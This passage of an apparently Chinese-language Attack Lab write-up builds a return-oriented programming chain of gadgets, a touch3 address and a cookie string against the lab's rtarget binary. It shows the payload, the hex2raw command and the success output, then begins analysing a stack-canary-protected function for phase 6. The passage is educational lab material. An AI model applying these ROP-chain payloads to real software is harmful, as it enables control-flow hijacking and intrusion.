<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401ef9</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> d6 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">20</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> db</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3  movl %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edx</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">esi</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">                        andb %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">bl</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">bl</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 7</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401ecf</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8d</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 04</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 37</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3  </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">lea</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsi</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">1</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">), %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 8</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">401e90</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">: </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c7 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">90</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3  </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">movq</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        nop</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>结合上述 gadgets，添加 <code>touch3</code> 函数地址和 cookie 字符串组成攻击载荷：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase5.txt */</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>2f 1f 40 00 00 00 00 00 /* Gadget 1 */</span></span>
<span class="line"><span>90 1e 40 00 00 00 00 00 /* Gadget 2 */</span></span>
<span class="line"><span>a6 1e 40 00 00 00 00 00 /* Gadget 3 */</span></span>
<span class="line"><span>48 00 00 00 00 00 00 00 /* Bias value 72 */</span></span>
<span class="line"><span>83 1f 40 00 00 00 00 00 /* Gadget 4 */</span></span>
<span class="line"><span>8e 1f 40 00 00 00 00 00 /* Gadget 5 */</span></span>
<span class="line"><span>f9 1e 40 00 00 00 00 00 /* Gadget 6 */</span></span>
<span class="line"><span>cf 1e 40 00 00 00 00 00 /* Gadget 7 */</span></span>
<span class="line"><span>90 1e 40 00 00 00 00 00 /* Gadget 8 */</span></span>
<span class="line"><span>1b 1d 40 00 00 00 00 00 /* Address of touch3 function */</span></span>
<span class="line"><span>32 34 63 38 63 65 36 36 00 /* cookie string &quot;24c8ce66&quot; */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转换为原始字节序列并传递给 <code>rtarget</code> 程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase5.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./rtarget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>Cookie: 0x24c8ce66</span></span>
<span class="line"><span>Type string:Touch3!: You called touch3(&quot;24c8ce66&quot;)</span></span>
<span class="line"><span>Valid solution for level 3 with target rtarget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="phase-6" tabindex="-1"><a class="header-anchor" href="#phase-6"><span>Phase 6</span></a></h2><p>在 phase 6 中，我们需要针对 <code>starget</code> 程序实现 ROP 攻击。但是有了栈溢出检测的保护，简单的栈溢出无法实现返回导向编程（ROP）攻击，并且 <code>starget</code> 中的 <code>getbuf_withcanary</code> 函数也不再像 <code>getbuf</code> 那样存在漏洞。</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf_withcanary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> len</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">128</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> logMsg</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">128</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    len </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    Gets</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    memcpy</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">logMsg </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> len</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> sizeof</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">));</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    return</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">0000000000401df6 &lt;getbuf_withcanary&gt;:</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401df6</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	55</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                   	push</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">   %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401df7</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e5             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401dfa</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 81</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ec </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">20</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 01</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> 	sub</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x120,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e01</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">64</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 48</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 8b </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">04</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 25</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 28</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> 	mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">fs</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x28</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e08</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e0a</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 45</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> f8          	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,-</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x8</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">)</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e0e</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	31</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c0                	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">xor</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e10</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	c7 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">45</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e4 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 	movl   $0x0,-</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x1c</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">)</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e17</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8d</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 85</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 60</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ff ff ff 	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">lea</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    -</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0xa0</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">),%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e1e</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c7             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e21</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	e8 c3 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">02</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	call</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   4020e9</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> &lt;Gets&gt;</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e26</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	8b </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">45</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e4             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    -</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x1c</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">),%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e29</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 98</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">                	cltq</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e2b</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8d</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 95</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e0 fe ff ff 	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">lea</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    -</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x120</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">),%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdx</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e32</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8d</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 0c </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">02</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">          	lea</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    (%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdx</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">1</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">),%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rcx</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e36</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8d</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 85</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 60</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ff ff ff 	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">lea</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    -</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0xa0</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">),%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e3d</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	ba </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">80</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x80,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edx</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e42</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c6             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsi</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e45</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> cf             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rcx</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span></span>
